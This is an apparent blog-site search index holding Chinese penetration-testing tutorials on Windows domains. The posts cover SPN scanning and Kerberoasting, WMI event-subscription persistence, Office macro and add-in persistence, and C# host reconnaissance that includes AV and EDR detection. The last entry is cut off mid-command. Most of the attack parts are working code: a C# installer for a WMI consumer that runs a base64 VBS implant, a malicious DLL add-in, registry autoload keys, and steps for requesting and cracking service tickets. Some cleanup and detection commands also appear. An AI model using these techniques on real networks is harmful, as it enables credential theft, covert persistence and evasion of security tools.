<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[【域渗透】 SPN 扫描利用]]></title>
    <url>%2F2019%2F06%2F%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%20SPN%20%E6%89%AB%E6%8F%8F%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Kerberos 与 SPN。为什么代码不高亮了？？？ 目瞪口呆！！！ 0x00 前言在内网渗透的信息收集中，机器服务探测一般都是通过端口扫描去做的，但是有些环境不允许这些操作。通过利用 SPN 扫描可快速定位开启了关键服务的机器，这样就不需要去扫对应服务的端口，有效规避端口扫描动作。 Kerberoasting 是域渗透中经常使用的一项技术，是通过爆破 TGS-REP 实现。 0x01 关于 SPN服务主体名称（SPN: Service Principal Names）是服务实例，可以将其理解为一个服务（比如 HTTP、MSSQL）的唯一标识符，服务在加入域中时是自动注册的。 如果在整个林或域中的计算机上安装多个服务实例，则每个实例都必须具有自己的 SPN。如果客户端可能使用多个名称进行身份验证，则给定服务实例可以具有多个 SPN。SPN 始终包含运行服务实例的主机的名称，因此服务实例可以为其主机名称或别名注册 SPN。 如果用一句话来说明的话就是如果想使用 Kerberos 协议来认证服务，那么必须正确配置 SPN。 SPN 可以分为两种： 注册在域内机器账户（Computers）上 注册在域内用户账户（Users）下 0x02 SPN 标准格式在 SPN 语法中存在 4 种元素，两个必须元素和两个格外元素。其中 &lt;service class&gt; 和 &lt;host&gt; 为必需元素。 123&lt;service class&gt;/&lt;host&gt;:&lt;port&gt; &lt;servername&gt;服务类型/对应机器名:服务端口[默认端口可不写]MSSQLSvc/SQLServer.rcoil.me:1433 0x03 使用 SetSPN 为机器(域用户)创建 SPN命令语法类似如下： 1Setspn -S http/&lt;computername&gt;.&lt;domainname&gt; &lt;domain-user-account&gt; -S 参数：验证不存在重复项后，添加随意 SPN。注意： -S 从 Windows Server 2008 开始系统默认提供。 此处以 Web 服务器为例。 以 web 用户 运行 Web 服务器 域管理员权限运行 cmd 12Setspn -s http/WebDemo_PC.rcoil.me rcoil\webSetspn -s http/WebDemo_PC.rcoil.me WebDemo_PC$ 结果如下： 0x04 借助 SetSPN 对域内相关服务进行查询4.1、查询域内 MSSQL 数据库服务器使用第 3 点中的对照表快速查询 1setspn -T rcoil.me -Q */* | findstr &quot;MSSQLSvc&quot; 4.2、相关查询 C# 源码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788using System;using System.Collections.Generic;using System.DirectoryServices;using System.DirectoryServices.ActiveDirectory;using System.Linq;using System.Text;using System.Text.RegularExpressions;namespace SPNSearcher&#123; class Program &#123; static void Main(string[] args) &#123; Domain CurrentDomain = Domain.GetCurrentDomain(); DirectoryEntry rootEntry = new DirectoryEntry(&quot;LDAP://rootDSE&quot;); string RootDSE = (string)rootEntry.Properties[&quot;defaultNamingContext&quot;].Value; Console.WriteLine(&quot;[*] Current Domain: &quot;+ CurrentDomain); GetSPNInfor(RootDSE); &#125; /// &lt;summary&gt; /// 通过 SPN 扫描获取域中基于主机的 MSSQL、Exchange 等服务 /// &lt;/summary&gt; /// ADSearcherSPNTypes = &quot;ADAM&quot;,&quot;AGPM&quot;,&quot;bo&quot;,&quot;CESREMOTE&quot;,&quot;Dfs&quot;,&quot;DNS&quot;,&quot;Exchange&quot;,&quot;FIMService&quot;,&quot;ftp&quot;,&quot;http&quot;,&quot;IMAP&quot;,&quot;ipp&quot;,&quot;iSCSITarget&quot;,&quot;kadmin&quot;,&quot;ldap&quot;,&quot;MS&quot;,&quot;sql&quot;,&quot;nfs&quot;,&quot;secshd&quot;,&quot;sip&quot;,&quot;SMTP&quot;,&quot;SoftGrid&quot;,&quot;TERMSRV&quot;,&quot;Virtual&quot;,&quot;vmrc&quot;,&quot;vnc&quot;,&quot;vpn&quot;,&quot;vssrvc&quot;,&quot;WSMAN&quot;,&quot;xmpp&quot; /// &lt;param name=&quot;RootDSE&quot;&gt;Current forest.&lt;/param&gt; public static void GetSPNInfor(string RootDSE) &#123; Console.WriteLine(&quot;[*] Current Domian SPN Information:&quot;); DirectoryEntry gcEntry = new DirectoryEntry(&quot;GC://&quot; + RootDSE); List&lt;string&gt; Supersedence = new List&lt;string&gt;(); Supersedence.AddRange(new string[] &#123; &quot;SQL:*MSSQL*:SQL Server 数据库&quot;, &quot;Exchange:*exchange*:Exchange 相关服务&quot;, &quot;DNS:*DNS*:DNS 服务&quot;, &quot;SQL:*MySql*:MySql 数据库&quot;, &quot;Oracle:*Oracle*:Oracle 数据库&quot;, &quot;postgres:*postgres*:Postgres 数据库&quot;, &quot;HTTPS:*HTTPS*:HTTPS Web 服务&quot;, &quot;HTTP:*HTTP*:HTTP Web 服务&quot;, &quot;VPN:*VPN*:VPN 远程接入服务&quot;, &quot;VNC:*VNC*:VNC 服务&quot; &#125;); foreach (string SPNServiceFilter in Supersedence) &#123; string[] sArray = Regex.Split(SPNServiceFilter, &quot;:&quot;, RegexOptions.IgnoreCase); string ContainsInfo = sArray[0].ToString(); string ADSearcherSPNTypes = sArray[1].ToString(); string SPNService = sArray[2].ToString(); using (gcEntry) &#123; DirectorySearcher spnSearch = new DirectorySearcher(gcEntry, &quot;(&amp;(objectClass=user)(servicePrincipalName=&quot; + ADSearcherSPNTypes + &quot;))&quot;); Console.WriteLine(); Console.WriteLine(&quot; [+] SPN service: &quot; + SPNService); foreach (SearchResult sr in spnSearch.FindAll()) &#123; var SPNs = sr.Properties[&quot;servicePrincipalName&quot;]; if (SPNs.Count &gt; 1) &#123; foreach (string spn in SPNs) &#123; if (spn.Contains(ContainsInfo)) &#123; Console.WriteLine(&quot; [&gt;] SAM Account Name: &#123;0&#125;&quot;, sr.Properties[&quot;sAMAccountName&quot;][0]); Console.WriteLine(&quot; [&gt;] &quot; + spn); break; &#125; &#125; &#125; else &#123; Console.WriteLine(&quot; [&gt;] &quot; + SPNs[0]); &#125; &#125; &#125; &#125; &#125; &#125;&#125; 自行添加需要的服务即可，更多的服务写在了备注中。 4.3、相关原理说明在 SPN 扫描时我们可以直接通过脚本，或者命令去获悉内网已经注册的 SPN 内容 LDAP 协议全称是 Lightweight Directory Access Protocol，一般翻译都是翻译成 轻量目录访问协议。通俗点可以把 LDAP 协议理解为一个关系型数据库，其中存储了域内主机的各种配置信息。 在域控中默认安装有 ADSI 编辑器，它是 LDAP 的编辑器，可以通过在域控中运行 adsiedit.msc 来打开。 我们的 SPN 查询，实际上就是就是查询 LDAP 中存储的内容。（以后会通过别的章节详细介绍 LDAP 协议） 下图是 4.2 中 MSSQL 查询的结果，协议为 LDAP。 4.4、更多扫描工具扫描工具有很多，但是只要知道原理就不会觉得太难。 1234Discover-PAMSSQLServers(Powershell-AD-Recon)GetUserSPNs(Powershell、vbs、Python)PowerView(Powershell)SetSPN(exe) 0x05 获取当前目标域中所有以域用户身份起服务的 SPN查询以域用户身份起的服务，主要是为了后续 Kerberoast做准备。 现成工具 12cscript.exe GetUserSPNs.vbspowerview --&gt; Get-NetUser -SPN C# 代码（其实就是查询LDAP）： 1234567891011121314151617181920public static void GetUserSPN(string RootDSE) &#123; Console.WriteLine(&quot;[*] Current Domian SPN Information:&quot;); Console.WriteLine(); DirectoryEntry gcEntry = new DirectoryEntry(&quot;GC://&quot; + RootDSE); string querySPN = @&quot;(&amp;(!objectClass=computer)(servicePrincipalName=*))&quot;; using (gcEntry) &#123; DirectorySearcher mssqlSearch = new DirectorySearcher(gcEntry, querySPN); foreach (SearchResult sr in mssqlSearch.FindAll()) &#123; Console.WriteLine(&quot; [&gt;] SamAccountName: &#123;0&#125;&quot;, sr.Properties[&quot;sAMAccountName&quot;][0]); Console.WriteLine(&quot; [&gt;] DistinguishedName: &#123;0&#125;&quot;, sr.Properties[&quot;distinguishedName&quot;][0]); Console.WriteLine(&quot; [&gt;] ServicePrincipalName: &#123;0&#125;&quot;, sr.Properties[&quot;servicePrincipalName&quot;][0]); Console.WriteLine(); &#125; &#125; &#125; 结果如下： 0x06 Kerberoast (Kerberos TGS服务票据(Service Ticket)离线爆破)6.1、申请 TGS powershell 12PS&gt;Add-Type -AssemblyName System.IdentityModelPS&gt;New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/WebDemo_PC.rcoil.me" C# 1234567891011public KerberosRequestorSecurityToken (string servicePrincipalName);参数servicePrincipalNameStringKerberosRequestorSecurityToken 安全令牌的服务主体名称。 设置 ServicePrincipalName 属性。异常ArgumentNullExceptionservicePrincipalName 为 null。SecurityTokenException无法为当前用户获取 Kerberos 票证。 这一整个过程是通过 AS-REQ、AS-REP、TGS-REQ、TGS-REP 这四个认证流程，最终获取到 RC4方式的加密票据。 6.2、获取 TGS-REPKerberos 协议中请求的票据会保存在内存中，可以通过 klist 命令查看当前会话存储的 kerberos 票据。 使用 mimikatz 的 kerberos::list /export 导出。 SharpRost （如今的Rubeus） Invoke-kerberoast 的 -outputformat ，选择 hashcat 格式。 综合以上代码，新建项目，项目地址: SPNSearcher 6.3、爆破 TGS-REP此处爆破的是HTTP/WebDemo_PC.rcoil.me 可选择工具（工具始终是工具，看的是字典强不强）:12tgsrepcrack.py(kerberoast套装)hashcat(密码破解全能工具，kali自带) 0x07 Kerberoasting 的后门利用在我们取得了 SPN 的修改权限后，可以为指定的域用户添加一个 SPN，这样可以随时获得该域用户的 TGS ，经过破解后获得明文口令。 0x08 参考为报表服务器注册服务主体名称 (SPN)KerberosRequestorSecurityToken(String)从 Kekeo 到 Rubeus域渗透——Kerberoasting]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[永久性 WMIC 事件订阅 - 权限维持（三）]]></title>
    <url>%2F2019%2F05%2F%E6%B0%B8%E4%B9%85%E6%80%A7%20WMIC%20%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85%20-%20%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%88%E4%B8%89%EF%BC%89%2F</url>
    <content type="text"><![CDATA[本文是针对Windows常见持久控制的第三次说明。 与之前的文章不同，这个操作需要管理员权限。 0x00 前言在日常中，使用 WMI 都是用于信息的收集，如下： 123456789wmic qfe list #获取补丁信息wmic startup list brief # 启动的程序wmic startup list full # 自启动的程序wmic process call create &quot;calc.exe&quot; # 在当前机器中执行指定程序wmic process where name=&apos;*.exe&apos; list full #查询某个进程所对应某个具体的可执行程序是什么wmic process where(description=&quot;rundll32.exe&quot;) # 查看rundll32所加载的dllwmic cpu get DataWidth /format:list # 查询当前机器的操作系统位数wmic share get name,path,status #利用wmic查找共享wmic logicaldisk where drivetype=3 get name,freespace,systemname,filesystem,volumeserialnumber,size #查看分区 但其实它的功能还有很多，比如： 12345防病毒检测代码执行横向移动持久化盗取数据 这里就针对持久化进行说明 。 0x01 查询 WMIWMI 提供了一种非常直观的语法用来查询WMI对象的实例，类和命名空间，即 WQL （类似 SQL的查询语言）。WQL查询通常可以分为以下几类： Instance Queries（实例查询）：查询WMI对象实例。 Event Queries（事件查询）：等同于在WMI对象创建/修改/删除的时候注册一个消息。 Meta Queries（元查询）：元查询用来获取WMI命名空间和类结构的元信息。 1.1 Instance Queries这是最常用的WQL查询。基本的格式如下：SELECT [Class property name | *] FROM [CLASS NAME] &lt;WHERE [CONSTRAINT]&gt; 下面的查询语句将返回所有可执行文件名中带有 chrome 的正在运行的进程：SELECT * FROM Win32_Process WHERE Name LIKE &quot;%chrome%&quot; 1.2 Event Queries事件查询被用作一种消息机制来监听事件类的触发。通常用来在一个WMI对象实例创建/修改/删除的时候给用户发送一个消息。根据消息类型是 intrinsic（系统自带的）还是 extrinsic（第三方的），查询语句格式不同： 123SELECT [Class property name | *] FROM [INTRINSIC CLASS NAME] WITHIN [POLLING INTERVAL] &lt;WHERE [CONSTRAINT]&gt;SELECT [Class property name | *] FROM [EXTRINSIC CLASS NAME] &lt;WHERE [CONSTRAINT]&gt; 用于登陆时都会触发此事件： 1SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstanceISA &apos;Win32_LogonSession&apos; AND TargetInstance.LogonType=2 每次用户在插入可移除设备时都会触发此事件： 1SELECT * FROM Win32_VolumeChangeEvent Where EventType=2 每次创建 win32 进程时都会触发此事件： 1Select * From __InstanceCreationEvent Where TargetInstance Isa &quot;Win32_Process&quot; 1.3 Meta Queries元查询用来查询WMI命名空间和类结构的信息。最常见的用法是用来列举WMI命名空间的类结构。元查询是实例查询的一个子集，但是与对象查询不同的是，我们查询的是类的实例的定义。 格式如下： 1SELECT [Class property name | *] FROM [Meta_Class | SYSTEM CLASS NAME] &lt;WHERE [CONSTRAINT]&gt; 下面这个语句会查询所有以 WIN32 开头的WMI的类：SELECT * FROM Meta_Class WHERE __CLASS LIKE &quot;Win32%&quot; 下面这个语句会查询某个命名空间下的所有命名空间：SELECT Name FROM __NAMESPACE 注意，当不显示的指定命名空间时，默认的命名空间为ROOT\CIMV2。 0x02 与WMI交互Microsoft和一些第三方软件开发者为我们提供了许多能够与WMI交互的工具。 下面是部分工具的一个不完全的列表 1234567891、PowerShell2、wmic.exe3、wbemtest.exe4、WMI Explorer5、CIM Studio6、Windows Script Host (WSH) languages7、C/C++ via IWbem* COM API8、.NET using System.Management classes9、winrm.exe 0x03 WMI事件WMI事件分两类，包括本地事件（运行在本地上下文环境当中的单个进程的事件）和永久性WMI事件订阅。 本地事件有生命周期为进程宿主的周期，而永久性 WMI事件 是存储在WMI库中，以 SYSTEM 权限运行，并且重启后依然存在。 3.1 前置条件为了能够安装一个永久性的 WMI 事件订阅，必须满足两个条件： 一个 __EventFilter 查询，它创建一个过滤器，为我们的特定事件选择触发器; Event Consumer Class，代表一个事件触发时所执行的操作。 在 Event Consumers（事件处理）中，可用的标准事件处理类：12345LogFileEventConsumer： 将事件数据写入到指定的日志文件ActiveScriptEventConsumer： 用来执行VBScript/JScript程序NTEventLogEventConsumer：创建一个包含事件数据的日志入口点SMTPEventConsumer：将事件数据用邮件发送CommandLineEventConsumer：执行一条命令 利用点 ActiveScriptEventConsumer，允许执行任意脚本（支持 JScript 和 VBScript 引擎） CommandLineEventConsumer，允许执行任意命令 3.2 测试使用以下查询进行测试： Select * From __InstanceCreationEvent Where TargetInstance Isa &quot;Win32_Process&quot; 为了方便测试，此处使用 Powershell 的 Register-WMIEvent 安装触发器。 以上测试不符合实际需求。 3.3 Powershell 实例（命令执行）下面的 PowerShell 代码来自一个叫 SEADADDY 的恶意软件的修改版，用来通过WMI做持久化的 12345678910111213141516171819202122232425$EventFilterName = 'BotFilter11'$EventConsumerName = 'BotConsumer22'$EventFilterArgs = @&#123; EventNamespace = 'root\cimv2' Name = $EventFilterName Query = 'Select * From __InstanceCreationEvent Where TargetInstance Isa "Win32_Process"' QueryLanguage="WQL"&#125;$WMIEventFilter = Set-WmiInstance -NameSpace 'root\subscription' -Class __EventFilter -Arguments $EventFilterArgs -ErrorAction Stop$CommandLineumerArgs =@&#123; Name=$EventConsumerName CommandLineTemplate='C:\Windows\System32\calc.exe'&#125;$WMIEventConsumer = Set-WmiInstance -Namespace 'root\subscription' -Class CommandLineEventConsumer -Arguments $CommandLineumerArgs$WMIEventFilterToConsumerArgs = @&#123; Filter=$WMIEventFilter Consumer=$WMIEventConsumer&#125;Set-WmiInstance -Namespace 'root\subscription' -Class __FilterToConsumerBinding -Arguments $WMIEventFilterToConsumerArgs 但是这里实测失败，就算使用C#去添加 CommandLineEventConsumer 也是失败的，但是 LogFileEventConsumer 可成功。 3.4 C# 实例（代码执行）本示例执行的是 VBScript 使用SharpShooter生成 VBSceipt 类型的 payload。友情提示：一定要生成 64位的 payload。 1234567891011121314&gt; python SharpShooter.py --stageless --dotnetver 2 --payload vbs --output implantvbs --rawscfile payload64.bin _____ __ _____ __ __ / ___// /_ ____ __________ / ___// /_ ____ ____ / /____ _____ \__ \/ __ \/ __ `/ ___/ __ \__ \/ __ \/ __ \/ __ \/ __/ _ \/ ___/ ___/ / / / / /_/ / / / /_/ /__/ / / / / /_/ / /_/ / /_/ __/ / /____/_/ /_/\__,_/_/ / .___/____/_/ /_/\____/\____/\__/\___/_/ /_/ Dominic Chell, @domchell, MDSec ActiveBreach, v2.0 [*] Written delivery payload to output/implantvbs.vbs运行vbs，成功上线，再进行 base64 编码&gt; base64 -i output/implantvbs.vbs &gt;&gt;implantvbs-base64.txt 示例代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970// WMI Event Subscription Peristence Demo// Author: @domchellusing System;using System.Text;using System.Management;namespace WMIPersistence&#123; class Program &#123; static void Main(string[] args) &#123; PersistWMI(); &#125; static void PersistWMI() &#123; ManagementObject myEventFilter = null; ManagementObject myEventConsumer = null; ManagementObject myBinder = null; string vbscript64 = &quot;&lt;INSIDE base64 encoded VBS here&gt;&quot;; string vbscript = Encoding.UTF8.GetString(Convert.FromBase64String(vbscript64)); try &#123; ManagementScope scope = new ManagementScope(@&quot;\\.\root\subscription&quot;); ManagementClass wmiEventFilter = new ManagementClass(scope, new ManagementPath(&quot;__EventFilter&quot;), null); String strQuery = @&quot;SELECT * FROM __InstanceCreationEvent WITHIN 5 &quot; + &quot;WHERE TargetInstance ISA \&quot;Win32_Process\&quot; &quot; + &quot;AND TargetInstance.Name = \&quot;notepad.exe\&quot;&quot;; WqlEventQuery myEventQuery = new WqlEventQuery(strQuery); myEventFilter = wmiEventFilter.CreateInstance(); myEventFilter[&quot;Name&quot;] = &quot;demoEventFilter&quot;; myEventFilter[&quot;Query&quot;] = myEventQuery.QueryString; myEventFilter[&quot;QueryLanguage&quot;] = myEventQuery.QueryLanguage; myEventFilter[&quot;EventNameSpace&quot;] = @&quot;\root\cimv2&quot;; myEventFilter.Put(); Console.WriteLine(&quot;[*] Event filter created.&quot;); myEventConsumer = new ManagementClass(scope, new ManagementPath(&quot;ActiveScriptEventConsumer&quot;), null).CreateInstance(); myEventConsumer[&quot;Name&quot;] = &quot;BadActiveScriptEventConsumer&quot;; myEventConsumer[&quot;ScriptingEngine&quot;] = &quot;VBScript&quot;; myEventConsumer[&quot;ScriptText&quot;] = vbscript; myEventConsumer.Put(); Console.WriteLine(&quot;[*] Event consumer created.&quot;); myBinder = new ManagementClass(scope, new ManagementPath(&quot;__FilterToConsumerBinding&quot;), null).CreateInstance(); myBinder[&quot;Filter&quot;] = myEventFilter.Path.RelativePath; myBinder[&quot;Consumer&quot;] = myEventConsumer.Path.RelativePath; myBinder.Put(); Console.WriteLine(&quot;[*] Subscription created&quot;); &#125; catch (Exception e) &#123; Console.WriteLine(e); &#125; // END CATCH Console.ReadKey(); &#125; // END FUNC &#125; // END CLASS&#125; // END NAMESPACE 管理员权限运行生成的exe，演示 GIF 0x04 WMI后门检测及清除4.1 Sysmon日志略…. 4.2 查看当前WMI Event12345678#List Event FiltersGet-WMIObject -Namespace root\Subscription -Class __EventFilter#List Event ConsumersGet-WMIObject -Namespace root\Subscription -Class __EventConsumer#List Event BindingsGet-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding 4.3 清除后门12345678#FilterGet-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter &quot;Name=&apos;BotFilter82&apos;&quot; | Remove-WmiObject -Verbose#ConsumerGet-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter &quot;Name=&apos;BotConsumer23&apos;&quot; | Remove-WmiObject -Verbose#BindingGet-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter &quot;__Path LIKE &apos;%BotFilter82%&apos;&quot; | Remove-WmiObject -Verbose 0x05 参考Persistence: “the continued or prolonged existence of something”: Part 3 – WMI Event SubscriptionWMI Attacks利用WMI构建无文件后门（基础篇）]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>权限维持</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Microsoft Office - 权限维持（一）]]></title>
    <url>%2F2019%2F05%2FMicrosoft%20Office%20-%20%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[本文是针对Windows常见持久控制的第一次说明。 0x00 前言前段时间有过个需求，判断 Office是否开启宏，索性将 Windows常见持久控制 中有关 Office 的记录也在后文写一下。 判断是否安装了 Microsoft Office 判断是否开启了 宏 相关利用 0x01 环境说明12345Microsoft Windows 7 Ultimate x64- Office 2007（实际环境）- Office 2010（测试环境）- Office 2013（测试环境）- Office 2016（测试环境） 0x02 相关判断 VBAWarnings 键值数值数据说明 12341:启用所有宏2:禁用所有宏并发出通知3:禁用无数字部署的所有宏4:禁用所有宏并且不通知 代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// 通过注册表检测 Office 是否开启宏 private static void OfficeVBAWarnings(string OfficeVersion) &#123; List&lt;string&gt; OfficeFeatures = new List&lt;string&gt;() &#123; &quot;Excel&quot;, &quot;Word&quot;, &quot;PowerPoint&quot; &#125;; foreach (string Features in OfficeFeatures) &#123; string basekey = @&quot;SOFTWARE\Microsoft\Office\&quot; + OfficeVersion + @&quot;\&quot; + Features + @&quot;\Security&quot;; RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(basekey); if (registryKey != null) &#123; string[] ValueNames = registryKey.GetValueNames(); if (registryKey.ValueCount == 0) &#123; Console.WriteLine(&quot; [&gt;] &#123;0&#125; VBAWarnings: 2&quot;, Features); &#125; else &#123; foreach (string KeyName in ValueNames) &#123; object VBAWarnings = registryKey.GetValue(&quot;VBAWarnings&quot;); Console.WriteLine(&quot; [&gt;] &#123;0&#125; VBAWarnings: &#123;1&#125;&quot;, Features, VBAWarnings); &#125; &#125; &#125; &#125; &#125; // 通过注册表检测 Office 版本 private static void OfficeIsInstall(string OfficeVersion) &#123; string basekey = @&quot;SOFTWARE\Microsoft\Office\&quot; + OfficeVersion + @&quot;\Common\InstallRoot&quot;; RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(basekey); if (registryKey != null) &#123; if (registryKey.GetValue(&quot;Path&quot;) != null) &#123; Console.WriteLine(&quot; [&gt;] Microsoft Office Version: &#123;0&#125;&quot;, OfficeVersion); OfficeVBAWarnings(OfficeVersion); &#125; &#125; &#125; static void Main(string[] args) &#123; List&lt;string&gt; OfficeVersions = new List&lt;string&gt;() &#123; &quot;8.0&quot;, &quot;9.0&quot;, &quot;10.0&quot;, &quot;11.0&quot;, &quot;12.0&quot;, &quot;14.0&quot;, &quot;15.0&quot;, &quot;16.0&quot; &#125;; foreach (string OfficeVersion in OfficeVersions) &#123; OfficeIsInstall(OfficeVersion); &#125; &#125; 0x03 Office 模板宏每次 Office 程序启动时都会加载使用 Office 程序中的基本模板。 相关位置 1234Word Normal.dotm位置：C:\Users(username)\AppData\Roaming\Microsoft\Templates\Normal.dotmExcel Personal.xlsb位置：C:\Users(username)\AppData\Roaming\Microsoft\Excel\XLSTART\PERSONAL.XLSB 这一部分在倾旋的博客有提到 新建宏名字 –&gt; word 为AutoOpen， Excel 为Auto_Open 使用 GIF 进行演示（Excel 同理） 本地使用相对应的 Office 版本生成的全局宏，替换目标机器对应的 Office 版本的全局宏，可行。 0x04 Office 加载项Office 中支持不同类型的加载项，从本质上来讲，Office 套装有很多受信任的位置，当放置库文件时，在打开 Office 程序时，会自动加载库文件。在 Office 的信任中心选择禁用加载项，实际上不会禁用WLL，也不会阻止VBA代码执行。 1）Word 的 WLL 加载项Word 的三个默认加载项位置如下所示： 对用户位置中的 Startup 进一步调查发现，它是 Word 默认存放全局模板和加载项的文件夹，当启动Word时，程序会自动加载 Startup 文件夹中所有*.dot、*.dotx或*.dotm格式的Word文件，也可以托管拓展名为 * .wll 的文件。而* .wll 文件本质上是一个带有额外特定于Office的扩展的DLL。这意味着* .wll 文件起码可以实现基本的 DLL 功能，我们只需要将*.dll 重命名为 *.wll，放入此文件夹中，可获取当前启动 word 的用户的执行权限。 示例： 123456789101112131415161718192021222324int Run()&#123; system("calc"); return 0;&#125;BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: Run(); // MessageBox(NULL, L"Hello World，I'm RcoIl", L"demo", MB_OK); // WinExec("calc.exe", SW_SHOWNORMAL); case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; 在这步骤出现了无法加载 wll 问题，所以我直接提问 Dominic Chell.，他给我的回答是： 123我在测试的时候也遇到了这样的问题，我认为它是使用了 UI 来弹出东西的，所以建议使用一个简单的 MessageBox 进行测试。并且确保是从 attach 当中调用 Run()。在使用 MessageBox 时，确保没有使用任何有关系统的东西（避免缺失 DLL），并尝试所有的switch cases exp 思路就不说了。 所以我最后使用了上面代码注释行。成功，结果如下。 2）Excel 的 XLL 加载项12在HKEY_CURRENT_USER\Software\Microsoft\Office\12.0\Excel\Options注册表项中添加一个键值OPEN /R DemoAddin.xll （字符串值） Excel 启动时，会自动检索 C:\Users(username)\AppData\Roaming\Microsoft\AddIns目录，所以不需要写入绝对路径，默认自动加载。 1// DemoAddin.xll EXPORTS is xlAutoOpen 3）PowerPoint 的 VBA 加载项1HKEY_CURRENT_USER\Software\Microsoft\Office\12.0\PowerPoint\AddIns\&lt;AddInName&gt; 文件格式为 *.ppam 或 *.ppa，也是与Excel 一样，放入AddIns 目录中。设置 Autoload 键值为 1 ，更改PowerPoint 启动时自动加载加载项。 关于wll(DLL) 、 xll(dll) 和 ppam(VBA) 的利用，可自行研究。 4）更多更多内容请阅读文章底部的参考文章。 0x05 参考Office Application StartupMAINTAINING ACCESS WITH NORMAL.DOTMBeyond good ol’ Run key, Part 62Add-In Opportunities for Office PersistencePersistence: “the continued or prolonged existence of something”: Part 1 – Microsoft OfficeEvilClippy]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>权限维持</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[通过编程实现的本地机器信息收集]]></title>
    <url>%2F2019%2F05%2F%E9%80%9A%E8%BF%87%E7%BC%96%E7%A8%8B%E5%AE%9E%E7%8E%B0%E7%9A%84%E6%9C%AC%E5%9C%B0%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[每获取一台机器权限，如果每次都手动操作重复一样的信息收集工作，无疑加大了工作量。 0x00 前言可选用 bat、C++、C# 进行编写程序，前两者运行无条件限制，后者需要判断 .NET 版本，由于一直是对 C# 较感兴趣，所以使用后者进行编写，也可以直接使用 execute-assembly 执行。 本文多数模块取之文末的 github 项目。 0x01 信息收集模块1）安全产品检测123456789101112131415161718192021222324252627282930313233343536373839404142public static void AV_EDR() &#123; /**- 获取进程信息 * - 枚举杀软进程列表（自定义列表） * - 存在则输出 * - 代码实现 * - 参考：https://raw.githubusercontent.com/harleyQu1nn/AggressorScripts/master/AVQuery.cna **/ string[] avproducts = &#123; &quot;Skynet&quot;,...., &quot;GDScan&quot; &#125;; Process[] proces = Process.GetProcesses(Environment.MachineName); Console.WriteLine(&quot;[+] Enumerating EDR products and Antivirus Processes on &quot; + Environment.MachineName + &quot;...&quot;); Console.WriteLine(&quot;[+] Loaded &quot; + avproducts.Length + &quot; AV Process Names&quot;); for (int i = 0; i &lt; proces.Length; i++) &#123; for (int a = 0; a &lt; avproducts.Length; a++) &#123; string processSearch = avproducts[a]; if (proces[i].ProcessName.Equals(processSearch)) &#123; Console.WriteLine(&quot;\t[!] Found AV Process: &quot; + proces[i].ProcessName); &#125; &#125; &#125; /**- 枚举列表（自定义列表） * - 使用 File.Exists 检测文件是否存在 * - 存在则输出 * - 代码实现 * - 参考：https://raw.githubusercontent.com/harleyQu1nn/AggressorScripts/master/EDR.cna **/ string[] edrproducts = &#123; &quot;CiscoAMPCEFWDriver.sys&quot;,...., &quot;amm6460.sys&quot; &#125;; Console.WriteLine(&quot;[+] Loaded &quot; + edrproducts.Length + &quot; EDR Product Names&quot;); string edrPath = @&quot;C:\Windows\System32\drivers\&quot;; for (int e = 0; e &lt; edrproducts.Length; e++) &#123; if (File.Exists(edrPath + edrproducts[e])) &#123; Console.WriteLine(&quot;\t[!] EDR driver found &quot; + edrproducts[e]); &#125; &#125; &#125; 2）计算机架构1234567891011121314151617181920212223242526public static void Mains() &#123; /* * - 直接使用 Environment * - 参考：https://docs.microsoft.com/en-us/dotnet/api/system.environment?view=netframework-4.8 */ Console.WriteLine(&quot;[+] Environment members &quot;); // 当前机器名 Console.WriteLine(&quot;\t[*] MachineName: &#123;0&#125;&quot;, Environment.MachineName); // 当前用户名 Console.WriteLine(&quot;\t[*] UserName: &#123;0&#125;&quot;, Environment.UserName); // 当前Domain名 Console.WriteLine(&quot;\t[*] UserDomainName: &#123;0&#125;&quot;, Environment.UserDomainName); // 当前系统版本 Console.WriteLine(&quot;\t[*] OSVersion: &#123;0&#125;&quot;, Environment.OSVersion.ToString()); // 当前目录 Console.WriteLine(&quot;\t[*] CurrentDirectory: &#123;0&#125;&quot;, Environment.CurrentDirectory); // 盘符 string[] drives = Environment.GetLogicalDrives(); Console.WriteLine(&quot;\t[*] GetLogicalDrives: &#123;0&#125;&quot;, String.Join(&quot;, &quot;, drives)); // 当前程序名 string[] arguments = Environment.GetCommandLineArgs(); Console.WriteLine(&quot;\t[*] GetCommandLineArgs: &#123;0&#125;&quot;, String.Join(&quot;, &quot;, arguments)); &#125; 3) 文件遍历12直接利用bat执行就可以FOR /F &quot;Skip=1&quot; %%I in 